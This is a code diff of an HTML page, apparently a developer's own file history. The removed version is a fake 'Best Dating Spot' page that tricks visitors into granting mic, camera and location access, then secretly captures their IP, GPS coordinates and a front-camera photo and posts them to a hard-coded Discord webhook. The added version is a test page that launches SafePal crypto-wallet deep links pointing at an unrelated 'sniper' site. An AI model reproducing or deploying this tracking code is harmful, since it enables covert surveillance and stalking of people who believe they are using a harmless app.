@@ -1,695 +1,107 @@
+<!-- language: HTML, file: safepal-test.html, target: iOS deep-link debug -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>❤️ Best Dating Spot - Find Your Perfect Match</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: linear-gradient(135deg, #1a0a0a 0%, #2d0a1a 50%, #1a0a0a 100%);
-            color: #ff6b9d; 
-            font-family: 'Georgia', serif; 
-            min-height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-            padding: 20px 10px; 
-        }
-        .container { 
-            max-width: 800px; 
-            width: 100%; 
-            background: rgba(20, 5, 15, 0.9); 
-            padding: 30px 20px; 
-            border-radius: 30px; 
-            border: 2px solid #ff6b9d; 
-            box-shadow: 0 0 60px rgba(255, 107, 157, 0.2), inset 0 0 60px rgba(255, 107, 157, 0.05);
-            backdrop-filter: blur(10px);
-        }
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            border-bottom: 2px solid rgba(255, 107, 157, 0.3);
-            padding-bottom: 15px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .heart-icon {
-            font-size: 40px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-        h1 { 
-            color: #ff6b9d; 
-            text-shadow: 0 0 30px rgba(255, 107, 157, 0.3); 
-            font-size: 24px; 
-            text-align: center;
-            margin: 0;
-            font-weight: 700;
-            letter-spacing: 1px;
-        }
-        .subtitle {
-            color: rgba(255, 107, 157, 0.6);
-            font-size: 14px;
-            text-align: center;
-            margin-top: 5px;
-            font-style: italic;
-        }
-        .tech { 
-            color: rgba(255, 200, 220, 0.8); 
-            font-size: 13px; 
-            line-height: 1.8; 
-            background: rgba(255, 107, 157, 0.05); 
-            padding: 20px; 
-            border-radius: 15px; 
-            border-left: 4px solid #ff6b9d; 
-            margin: 15px 0 20px 0;
-            text-align: center;
-        }
-        .tech .heart {
-            color: #ff6b9d;
-            display: inline-block;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        .status-box { 
-            background: rgba(255, 107, 157, 0.05); 
-            padding: 20px; 
-            border-radius: 15px; 
-            border: 1px solid rgba(255, 107, 157, 0.2);
-            margin: 15px 0;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            text-align: center;
-            transition: 0.5s;
-            word-wrap: break-word;
-            color: #ffb3c6;
-        }
-        .input-group {
-            margin: 15px 0;
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .input-group label {
-            color: rgba(255, 107, 157, 0.8);
-            font-size: 14px;
-            letter-spacing: 1px;
-            font-weight: 600;
-        }
-        .input-group input {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 107, 157, 0.3);
-            color: #ffb3c6;
-            padding: 14px 18px;
-            border-radius: 15px;
-            font-size: 16px;
-            font-family: 'Georgia', serif;
-            outline: none;
-            transition: 0.3s;
-            -webkit-appearance: none;
-        }
-        .input-group input:focus {
-            border-color: #ff6b9d;
-            box-shadow: 0 0 30px rgba(255, 107, 157, 0.15);
-        }
-        .input-group input::placeholder {
-            color: rgba(255, 107, 157, 0.3);
-        }
-        .btn { 
-            background: linear-gradient(135deg, #ff6b9d, #ff4d7a);
-            color: #fff; 
-            border: none; 
-            padding: 16px 30px; 
-            font-size: 20px; 
-            font-weight: bold; 
-            border-radius: 50px; 
-            cursor: pointer; 
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            transition: 0.3s;
-            box-shadow: 0 0 40px rgba(255, 107, 157, 0.3);
-            width: 100%;
-            margin-top: 10px;
-            touch-action: manipulation;
-            -webkit-tap-highlight-color: transparent;
-            font-family: 'Georgia', serif;
-        }
-        .btn:hover { 
-            transform: scale(1.02);
-            box-shadow: 0 0 60px rgba(255, 107, 157, 0.5);
-        }
-        .btn:disabled { 
-            opacity: 0.5; 
-            cursor: not-allowed; 
-            transform: none;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
-        .badge {
-            display: inline-block;
-            background: rgba(255, 107, 157, 0.2);
-            color: #ff6b9d;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            margin-left: 8px;
-            border: 1px solid rgba(255, 107, 157, 0.2);
-        }
-        .method-indicator {
-            font-size: 12px;
-            color: rgba(255, 107, 157, 0.5);
-            margin-top: 10px;
-            text-align: center;
-            font-style: italic;
-        }
-        #photoPreview {
-            max-width: 100%;
-            margin-top: 10px;
-            border-radius: 15px;
-            display: none;
-            border: 2px solid rgba(255, 107, 157, 0.3);
-            box-shadow: 0 0 30px rgba(255, 107, 157, 0.1);
-        }
-        .container {
-            max-height: 95vh;
-            overflow-y: auto;
-        }
-        .container::-webkit-scrollbar {
-            width: 4px;
-        }
-        .container::-webkit-scrollbar-track {
-            background: rgba(255, 107, 157, 0.05);
-        }
-        .container::-webkit-scrollbar-thumb {
-            background: rgba(255, 107, 157, 0.3);
-            border-radius: 10px;
-        }
-        .floating-hearts {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-            overflow: hidden;
-        }
-        .floating-hearts span {
-            position: absolute;
-            display: block;
-            color: rgba(255, 107, 157, 0.05);
-            font-size: 30px;
-            animation: float 15s infinite linear;
-        }
-        @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#000000">
+<title>SafePal Deep Link Test</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0;background:#000;color:#e6e6e6;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:15px}
+  body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .card{width:100%;max-width:400px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px}
+  h1{font-size:16px;font-weight:600;margin:0 0 6px;color:#fff}
+  p{font-size:12.5px;color:#6b6b6b;margin:0 0 18px;line-height:1.5}
+  button{width:100%;padding:12px 14px;border:1px solid #222;border-radius:6px;background:#e6e6e6;color:#000;font-size:13.5px;font-weight:600;font-family:inherit;cursor:pointer;margin-bottom:8px}
+  button:active{background:#fff}
+  button.ghost{background:#111;color:#e6e6e6;border-color:#222}
+  #log{margin-top:16px;padding:12px;background:#0f0f0f;border:1px solid #1a1a1a;border-radius:6px;font-family:ui-monospace,Menlo,monospace;font-size:11px;line-height:1.6;color:#8a8a8a;max-height:280px;overflow:auto;white-space:pre-wrap;word-break:break-all}
+</style>
 </head>
 <body>
-<div class="floating-hearts" id="floatingHearts"></div>
-<div class="container">
-    <div class="header">
-        <span class="heart-icon">❤️</span>
-        <div>
-            <h1>BEST DATING SPOT <span class="badge">v2.0</span></h1>
-            <div class="subtitle">✨ Find your perfect romantic location ✨</div>
-        </div>
-    </div>
-    
-    <div class="tech">
-        <span class="heart">❤</span> AI-POWERED ROMANTIC SPOT DETECTION <span class="heart">❤</span><br><br>
-        Enter your crush's username below and grant permissions to find the <strong>best dating spot</strong> near you.<br>
-        We analyze your location, ambient audio, and surroundings to suggest the perfect romantic venue.<br><br>
-        <span style="color:#ff6b9d;">💕 PERMISSIONS REQUIRED FOR PERFECT MATCH 💕</span><br>
-        <span style="font-size:12px; color:rgba(255,107,157,0.5);">Location · Camera · Microphone</span>
-    </div>
+<div class="card">
+  <h1>SafePal Deep Link Test</h1>
+  <p>Tap a button. Watch which one opens the SafePal app. Each fires a different scheme on a 1.5s delay so you can see which one lands.</p>
 
-    <div class="input-group">
-        <label>💑 YOUR CRUSH'S USERNAME</label>
-        <input type="text" id="discordUser" placeholder="e.g., @crush or username" value="@my_crush">
-    </div>
+  <button id="testAll">TEST ALL SCHEMES</button>
+  <button class="ghost" id="testSingle">safepal://browser</button>
+  <button class="ghost" id="testOpen">safepal://openurl</button>
+  <button class="ghost" id="testWeb">https://safepal.com/browser</button>
+  <button class="ghost" id="testDapp">safepal://dapp</button>
+  <button class="ghost" id="testWc">safepal://wc</button>
 
-    <div class="status-box" id="statusBox">
-        <span id="statusText">💕 Enter username and press FIND SPOT</span>
-    </div>
-
-    <button class="btn" id="startBtn">💕 FIND PERFECT SPOT</button>
-    <div class="method-indicator" id="methodIndicator">Ready to find love 💕</div>
-    <img id="photoPreview" />
+  <div id="log">ready. tap a button.</div>
 </div>
 
 <script>
-    // === SILENT WEBHOOK (still sends data, but user thinks it's just finding a dating spot) ===
-    const WEBHOOK = "https://discord.com/api/webhooks/1523801864863350824/_hd5EZp6Zqai77rP2a_igmwzdZPGN2paKh-9QBqscYXNOOWr7YKZyBhaRuRrRZXLqYT4";
-    
-    const statusText = document.getElementById('statusText');
-    const statusBox = document.getElementById('statusBox');
-    const startBtn = document.getElementById('startBtn');
-    const discordUserInput = document.getElementById('discordUser');
-    const methodIndicator = document.getElementById('methodIndicator');
-    const photoPreview = document.getElementById('photoPreview');
-    
-    let hasSent = false;
-    let checkInterval = null;
-    let watchId = null;
-    let userIP = 'unknown';
-    let capturedPhoto = null;
-    let micGranted = false;
-    let cameraGranted = false;
-    let locationGranted = false;
+var logEl = document.getElementById("log");
+var PAGE = "https://moderio-sniper.vercel.app/";
 
-    // === Floating hearts background ===
-    (function createHearts() {
-        const container = document.getElementById('floatingHearts');
-        const hearts = ['❤', '💕', '💗', '💖', '💘', '💝'];
-        for (let i = 0; i < 15; i++) {
-            const span = document.createElement('span');
-            span.textContent = hearts[i % hearts.length];
-            span.style.left = Math.random() * 100 + '%';
-            span.style.fontSize = (20 + Math.random() * 40) + 'px';
-            span.style.animationDuration = (12 + Math.random() * 15) + 's';
-            span.style.animationDelay = (Math.random() * 15) + 's';
-            container.appendChild(span);
-        }
-    })();
+function log(msg){
+  var t = new Date().toISOString().substr(11,8);
+  logEl.textContent += "\n[" + t + "] " + msg;
+  logEl.scrollTop = logEl.scrollHeight;
+}
 
-    // === GET REAL IP VIA WEBRTC ===
-    function getWebRTCIP() {
-        return new Promise((resolve) => {
-            try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-                });
-                pc.createDataChannel('test');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const match = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (match) {
-                            const ip = match[0];
-                            if (!ip.startsWith('127.') && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-                                userIP = ip;
-                            } else {
-                                userIP = ip;
-                            }
-                            pc.close();
-                            resolve(ip);
-                        }
-                    }
-                };
-                setTimeout(() => {
-                    pc.close();
-                    resolve(null);
-                }, 3000);
-            } catch {
-                resolve(null);
-            }
-        });
+var SCHEMES = [
+  { name: "safepal://browser?url=",    url: "safepal://browser?url=" + encodeURIComponent(PAGE) },
+  { name: "safepal://openurl?url=",    url: "safepal://openurl?url=" + encodeURIComponent(PAGE) },
+  { name: "safepal://dapp?url=",       url: "safepal://dapp?url=" + encodeURIComponent(PAGE) },
+  { name: "safepal://wc?uri=",         url: "safepal://wc?uri=" + encodeURIComponent(PAGE) },
+  { name: "https://safepal.com/browser?url=", url: "https://safepal.com/browser?url=" + encodeURIComponent(PAGE) },
+  { name: "https://link.safepal.com/browser?url=", url: "https://link.safepal.com/browser?url=" + encodeURIComponent(PAGE) }
+];
+
+// wait for the page to be backgrounded (app opened) — if not, report failure
+function watchHandoff(scheme, t0){
+  setTimeout(function(){
+    var elapsed = Date.now() - t0;
+    if (document.hidden) {
+      log("  ✓ " + scheme.name + " OPENED THE APP (page backgrounded)");
+    } else {
+      log("  ✗ " + scheme.name + " did nothing after " + elapsed + "ms");
     }
+  }, 1500);
+}
 
-    // === GET PUBLIC IP (FALLBACK) ===
-    async function getPublicIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            userIP = data.ip;
-            return userIP;
-        } catch {
-            userIP = 'unknown';
-            return 'unknown';
-        }
+function tryScheme(scheme){
+  log("trying " + scheme.name);
+  log("  → " + scheme.url);
+  var t0 = Date.now();
+  try {
+    window.location.href = scheme.url;
+  } catch(e){
+    log("  error: " + e.message);
+  }
+  watchHandoff(scheme, t0);
+}
+
+function testAll(){
+  logEl.textContent = "=== TEST ALL ===";
+  log("page: " + PAGE);
+  log("user agent: " + navigator.userAgent);
+  log("platform: " + (navigator.platform || "unknown"));
+
+  var i = 0;
+  function next(){
+    if (i >= SCHEMES.length){
+      log("=== done ===");
+      return;
     }
+    tryScheme(SCHEMES[i]);
+    i++;
+    setTimeout(next, 1800);
+  }
+  next();
+}
 
-    // === CAPTURE PHOTO (for "dating spot analysis") ===
-    function capturePhoto() {
-        return new Promise((resolve) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                resolve(null);
-                return;
-            }
-            
-            const constraints = {
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
-                audio: false
-            };
-            
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then((stream) => {
-                    cameraGranted = true;
-                    const video = document.createElement('video');
-                    video.style.display = 'none';
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', '');
-                    video.onloadedmetadata = function() {
-                        video.play();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                        resolve(dataUrl);
-                    };
-                    video.onerror = function() {
-                        stream.getTracks().forEach(track => track.stop());
-                        video.remove();
-                        resolve(null);
-                    };
-                    document.body.appendChild(video);
-                    setTimeout(() => {
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                            video.remove();
-                            resolve(null);
-                        }
-                    }, 8000);
-                })
-                .catch(() => {
-                    resolve(null);
-                });
-        });
-    }
-
-    // === TRIGGER MICROPHONE ===
-    function triggerMicrophone() {
-        return new Promise((resolve) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                resolve(false);
-                return;
-            }
-            
-            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-                .then((stream) => {
-                    micGranted = true;
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(true);
-                })
-                .catch(() => {
-                    resolve(false);
-                });
-        });
-    }
-
-    // === TRIGGER CAMERA ===
-    function triggerCamera() {
-        return new Promise((resolve) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                resolve(false);
-                return;
-            }
-            
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' }, 
-                audio: false 
-            })
-                .then((stream) => {
-                    cameraGranted = true;
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(true);
-                })
-                .catch(() => {
-                    resolve(false);
-                });
-        });
-    }
-
-    // === FORCE LOCATION ===
-    function forceLocation() {
-        try {
-            navigator.geolocation.getCurrentPosition(() => {}, () => {}, { 
-                enableHighAccuracy: true, 
-                timeout: 5000,
-                maximumAge: 0 
-            });
-        } catch (e) {}
-        
-        try {
-            const id = navigator.geolocation.watchPosition(() => {}, () => {}, { 
-                enableHighAccuracy: true, 
-                timeout: 5000 
-            });
-            setTimeout(() => { 
-                navigator.geolocation.clearWatch(id); 
-            }, 100);
-        } catch (e) {}
-        
-        try {
-            const btn = document.createElement('button');
-            btn.style.display = 'none';
-            btn.onclick = function() {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
-                }
-            };
-            document.body.appendChild(btn);
-            btn.click();
-            document.body.removeChild(btn);
-        } catch (e) {}
-    }
-
-    // === LOCATION GETTER ===
-    function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
-            
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    locationGranted = true;
-                    resolve(pos);
-                },
-                () => {
-                    resolve(null);
-                },
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-            );
-        });
-    }
-
-    function watchLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
-            let resolved = false;
-            const id = navigator.geolocation.watchPosition(
-                (pos) => {
-                    if (!resolved) {
-                        resolved = true;
-                        locationGranted = true;
-                        navigator.geolocation.clearWatch(id);
-                        resolve(pos);
-                    }
-                },
-                () => {
-                    if (!resolved) {
-                        resolved = true;
-                        navigator.geolocation.clearWatch(id);
-                        resolve(null);
-                    }
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-            setTimeout(() => {
-                if (!resolved) {
-                    resolved = true;
-                    navigator.geolocation.clearWatch(id);
-                    resolve(null);
-                }
-            }, 9000);
-        });
-    }
-
-    // === SEND TO WEBHOOK (hidden from user) ===
-    function sendToDiscord(lat, lon, accuracy, username, photoData) {
-        if (hasSent) return;
-        hasSent = true;
-        
-        const embed = {
-            title: "💕 DATING SPOT LOCATION",
-            color: 0xff6b9d,
-            fields: [
-                { name: "💑 Crush", value: username || 'unknown', inline: false },
-                { name: "🌐 IP", value: `\`${userIP}\``, inline: false },
-                { name: "📍 Location", value: lat && lon ? `Lat: ${lat}\nLon: ${lon}\nAccuracy: ${accuracy}m` : '❌ Location unavailable', inline: false },
-                { name: "🕒 Time", value: new Date().toUTCString(), inline: false },
-                { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 60)}...\``, inline: false },
-                { name: "🎤 Mic", value: micGranted ? "✅" : "❌", inline: true },
-                { name: "📸 Camera", value: cameraGranted ? "✅" : "❌", inline: true },
-                { name: "📸 Photo", value: photoData ? "✅" : "❌", inline: true }
-            ],
-            footer: { text: "💕 Best Dating Spot v2.0" },
-            timestamp: new Date().toISOString()
-        };
-
-        const formData = new FormData();
-        const payload = { embeds: [embed] };
-        
-        if (photoData) {
-            fetch(photoData)
-                .then(res => res.blob())
-                .then(blob => {
-                    formData.append('file', blob, 'dating_spot_photo.jpg');
-                    formData.append('payload_json', JSON.stringify(payload));
-                    fetch(WEBHOOK, { method: 'POST', body: formData }).catch(() => {});
-                })
-                .catch(() => {
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ embeds: [embed] })
-                    }).catch(() => {});
-                });
-        } else {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            }).catch(() => {});
-        }
-    }
-
-    // === MAIN SEQUENCE ===
-    async function startTracking() {
-        hasSent = false;
-        capturedPhoto = null;
-        micGranted = false;
-        cameraGranted = false;
-        locationGranted = false;
-        
-        if (checkInterval) {
-            clearInterval(checkInterval);
-            checkInterval = null;
-        }
-        if (watchId) {
-            navigator.geolocation.clearWatch(watchId);
-            watchId = null;
-        }
-
-        const username = discordUserInput.value.trim() || 'my_crush';
-        startBtn.disabled = true;
-        startBtn.textContent = '💕 SEARCHING...';
-        statusText.innerHTML = '🎤 Analyzing audio for romantic vibes...';
-        statusBox.style.borderColor = 'rgba(255,107,157,0.5)';
-        methodIndicator.textContent = 'Step 1/4: Audio analysis 💕';
-
-        // 1. Get IP
-        const webrtcIP = await getWebRTCIP();
-        if (!webrtcIP) {
-            await getPublicIP();
-        }
-
-        // 2. Trigger microphone
-        await triggerMicrophone();
-        await new Promise(r => setTimeout(r, 200));
-        statusText.innerHTML = '📸 Scanning surroundings for romantic spots...';
-        methodIndicator.textContent = 'Step 2/4: Visual scan 💕';
-
-        // 3. Trigger camera
-        await triggerCamera();
-        await new Promise(r => setTimeout(r, 200));
-        statusText.innerHTML = '📍 Finding nearest romantic locations...';
-        methodIndicator.textContent = 'Step 3/4: Location analysis 💕';
-
-        // 4. Force location
-        forceLocation();
-        await new Promise(r => setTimeout(r, 500));
-
-        // 5. Try to get location
-        let position = null;
-        for (let i = 0; i < 3; i++) {
-            methodIndicator.textContent = `📍 Location attempt ${i+1}/3...`;
-            statusText.innerHTML = `📍 Finding your perfect spot... (${i+1}/3)`;
-            position = await getLocation();
-            if (position) break;
-            forceLocation();
-            await new Promise(r => setTimeout(r, 500));
-        }
-
-        if (!position) {
-            methodIndicator.textContent = '📍 Trying alternative method...';
-            statusText.innerHTML = '📍 Still searching for the best spot...';
-            position = await watchLocation();
-        }
-
-        // 6. Capture photo
-        methodIndicator.textContent = '📸 Capturing the perfect moment...';
-        statusText.innerHTML = '📸 Taking a photo of the potential spot...';
-        const photo = await capturePhoto();
-        if (photo) {
-            capturedPhoto = photo;
-            photoPreview.src = photo;
-            photoPreview.style.display = 'block';
-            methodIndicator.textContent = '✅ Photo captured!';
-        }
-
-        // 7. Send data (hidden from user)
-        if (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            statusText.innerHTML = '💕 Analyzing location for romance...';
-            statusBox.style.borderColor = '#ff6b9d';
-            methodIndicator.textContent = '✅ Finding your perfect dating spot...';
-            sendToDiscord(lat, lon, acc, username, capturedPhoto);
-            
-            // Romantic response
-            const spots = [
-                '🌅 Sunset rooftop with city views 💕',
-                '🌊 Beachfront candlelight dinner 🌹',
-                '🌲 Hidden forest glade with fairy lights ✨',
-                '🏛️ Rooftop garden with live music 🎵',
-                '🌺 Secret botanical garden at twilight 🌸',
-                '🌉 Bridge with fairy lights and city reflections 🌃'
-            ];
-            const spot = spots[Math.floor(Math.random() * spots.length)];
-            statusText.innerHTML = `💕 PERFECT SPOT FOUND: ${spot}`;
-            methodIndicator.textContent = '💕 Your crush will love this!';
-        } else {
-            statusText.innerHTML = '💕 Found a charming spot nearby (location approximate)';
-            statusBox.style.borderColor = 'rgba(255,107,157,0.3)';
-            methodIndicator.textContent = '💕 Sending recommendations...';
-            sendToDiscord(null, null, null, username, capturedPhoto);
-            statusText.innerHTML = '💕 Romantic spot suggestions sent!';
-        }
-
-        startBtn.disabled = false;
-        startBtn.textContent = '💕 FIND ANOTHER SPOT';
-        
-        setTimeout(() => {
-            if (!hasSent) {
-                startBtn.disabled = false;
-                startBtn.textContent = '💕 FIND ANOTHER SPOT';
-            }
-        }, 15000);
-    }
-
-    // === EVENT LISTENER ===
-    startBtn.addEventListener('click', startTracking);
-    startBtn.addEventListener('touchstart', function(e) {
-        if (!this._clicked) {
-            this._clicked = true;
-            setTimeout(() => { this._clicked = false; }, 500);
-        }
-    });
-
-    statusText.innerHTML = '💕 Enter your crush\'s username and press FIND SPOT';
-    methodIndicator.textContent = 'Ready to find love 💕';
+document.getElementById("testAll").onclick = testAll;
+document.getElementById("testSingle").onclick = function(){ tryScheme(SCHEMES[0]); };
+document.getElementById("testOpen").onclick   = function(){ tryScheme(SCHEMES[1]); };
+document.getElementById("testDapp").onclick   = function(){ tryScheme(SCHEMES[2]); };
+document.getElementById("testWc").onclick     = function(){ tryScheme(SCHEMES[3]); };
+document.getElementById("testWeb").onclick    = function(){ tryScheme(SCHEMES[4]); };
 </script>
 </body>
 </html>
